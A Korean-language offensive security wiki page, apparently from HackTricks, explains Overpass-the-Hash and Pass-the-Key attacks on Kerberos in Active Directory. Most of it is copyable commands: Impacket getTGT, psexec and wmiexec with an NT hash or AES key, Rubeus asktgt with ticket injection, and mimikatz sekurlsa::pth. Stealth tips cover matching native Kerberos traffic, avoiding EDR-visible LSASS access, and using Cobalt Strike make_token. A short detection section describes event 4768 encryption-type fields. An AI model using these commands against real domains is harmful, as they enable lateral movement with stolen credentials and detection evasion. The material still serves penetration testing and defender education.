# Over Pass the Hash/Pass the Key

{{#include ../../banners/hacktricks-training.md}}


## Overpass The Hash/Pass The Key (PTK)

**Overpass The Hash/Pass The Key (PTK)** 공격은 전통적인 NTLM 프로토콜이 제한되고 Kerberos 인증이 우선되는 환경을 위해 설계되었다. 이 공격은 사용자의 NTLM hash 또는 AES keys를 활용해 Kerberos tickets를 요청하며, 이를 통해 network 내 리소스에 대한 무단 접근을 가능하게 한다.

엄밀히 말하면:

- **Over-Pass-the-Hash**는 보통 **NT hash**를 **RC4-HMAC** Kerberos key를 통해 Kerberos TGT로 바꾸는 것을 의미한다.
- **Pass-the-Key**는 더 일반적인 형태로, 이미 **AES128/AES256** 같은 Kerberos key를 가지고 있고 그것으로 직접 TGT를 요청하는 경우를 말한다.

이 차이는 hardened environments에서 중요하다: **RC4가 비활성화**되었거나 KDC가 더 이상 이를 가정하지 않는다면, **NT hash만으로는 충분하지 않으며** **AES key**(또는 이를 유도할 수 있는 cleartext password)가 필요하다.

이 공격을 실행하려면, 먼저 대상 사용자 계정의 NTLM hash 또는 password를 확보해야 한다. 이 정보를 얻으면 해당 계정의 Ticket Granting Ticket (TGT)를 획득할 수 있으며, 이를 통해 attacker는 사용자가 권한을 가진 services나 machines에 접근할 수 있다.

이 과정은 다음 commands로 시작할 수 있다:
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
AES256가 필요한 시나리오에서는 `-aesKey [AES key]` 옵션을 사용할 수 있습니다:
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -aesKey <AES256_HEX>
export KRB5CCNAME=velociraptor.ccache
python wmiexec.py -k -no-pass jurassic.park/velociraptor@labwws02.jurassic.park
```
`getTGT.py`는 `-service <SPN>`를 사용해 **AS-REQ를 통해 직접 service ticket을 요청**하는 것도 지원하며, 추가적인 TGS-REQ 없이 특정 SPN에 대한 ticket이 필요할 때 유용할 수 있습니다:
```bash
python getTGT.py -dc-ip 10.10.10.10 -aesKey <AES256_HEX> -service cifs/labwws02.jurassic.park jurassic.park/velociraptor
```
또한 획득한 ticket는 `smbexec.py` 또는 `wmiexec.py`를 포함한 다양한 tools와 함께 사용될 수 있어, attack의 범위를 넓힐 수 있습니다.

_PyAsn1Error_ 또는 _KDC cannot find the name_과 같은 issues는 보통 Impacket library를 업데이트하거나 IP address 대신 hostname을 사용하면 해결되며, Kerberos KDC와의 compatibility를 보장합니다.

Rubeus.exe를 사용하는 대체 command sequence는 이 technique의 또 다른 측면을 보여줍니다:
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
이 방법은 **Pass the Key** 접근 방식을 따르며, 인증 목적으로 ticket을 직접 장악하고 활용하는 데 초점을 맞춥니다. 실제로:

- `Rubeus asktgt`는 **raw Kerberos AS-REQ/AS-REP** 자체를 전송하며, `/luid`로 다른 logon session을 대상으로 하거나 `/createnetonly`로 별도의 session을 만들려는 경우가 아니라면 **admin 권한이 필요하지 않습니다**.
- `mimikatz sekurlsa::pth`는 credential material을 logon session에 패치하므로 **LSASS에 접근**하며, 이는 보통 local admin 또는 `SYSTEM`을 필요로 하고 EDR 관점에서 더 눈에 띕니다.

Mimikatz 예시:
```bash
sekurlsa::pth /user:velociraptor /domain:jurassic.park /ntlm:2a3de7fe356ee524cc9f3d579f2e0aa7 /run:cmd.exe
sekurlsa::pth /user:velociraptor /domain:jurassic.park /aes256:<AES256_HEX> /run:cmd.exe
```
운영 보안에 맞추고 AES256을 사용하려면 다음 명령을 적용할 수 있습니다:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
`/opsec`는 Rubeus-generated traffic가 native Windows Kerberos와 약간 다르기 때문에 relevant하다. 또한 `/opsec`는 **AES256** traffic용으로 intended되었으며, RC4에 사용하면 보통 `/force`가 필요하다. 하지만 이는 **modern domains에서 RC4 자체가 강한 signal**이기 때문에 원래 목적의 상당 부분을 무너뜨린다.

## Detection notes

모든 TGT request는 DC에서 **event `4768`**을 생성한다. current Windows builds에서는 이 event가 older writeups가 언급하는 것보다 더 유용한 fields를 포함한다:

- `TicketEncryptionType`는 issued TGT에 사용된 enctype을 알려준다. Typical values는 **RC4-HMAC**의 경우 `0x17`, **AES128**의 경우 `0x11`, **AES256**의 경우 `0x12`이다.
- Updated events는 `SessionKeyEncryptionType`, `PreAuthEncryptionType`, 그리고 client's advertised enctypes도 노출하므로, **real RC4 dependence**와 헷갈리는 legacy defaults를 구분하는 데 도움이 된다.
- modern environment에서 `0x17`을 보면 account, host, 또는 KDC fallback path가 아직 RC4를 허용한다는 좋은 clue이며, 따라서 NT-hash-based Over-Pass-the-Hash에 더 friendly하다는 뜻이다.

Microsoft는 November 2022 Kerberos hardening updates 이후 RC4-by-default behavior를 점진적으로 줄여 왔으며, 현재 published guidance는 **Q2 2026 말까지 AD DCs에서 default assumed enctype으로서 RC4를 제거**하는 것이다. offensive perspective에서 보면, 이는 **AES를 사용한 Pass-the-Key**가 점점 더 reliable path가 되는 반면, classic **NT-hash-only OpTH**는 hardened estates에서 더 자주 실패하게 된다는 뜻이다.

Kerberos encryption types와 관련 ticketing behaviour에 대한 더 자세한 내용은 다음을 확인하라:

{{#ref}}
kerberos-authentication.md
{{#endref}}

## Stealthier version

> [!WARNING]
> 각 logon session은 동시에 하나의 active TGT만 가질 수 있으므로 주의하라.

1. Cobalt Strike의 **`make_token`**으로 새로운 logon session을 생성한다.
2. 그런 다음, 기존 session에 영향을 주지 않고 새 logon session용 TGT를 생성하기 위해 Rubeus를 사용한다.

Rubeus 자체에서 sacrificial **logon type 9** session을 사용하면 비슷한 isolation을 달성할 수 있다:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES256_HEX> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
이렇게 하면 현재 세션 TGT를 덮어쓰지 않으며, 보통 기존 logon session에 ticket를 가져오는 것보다 더 안전합니다.


## References

- [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
- [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)


{{#include ../../banners/hacktricks-training.md}}
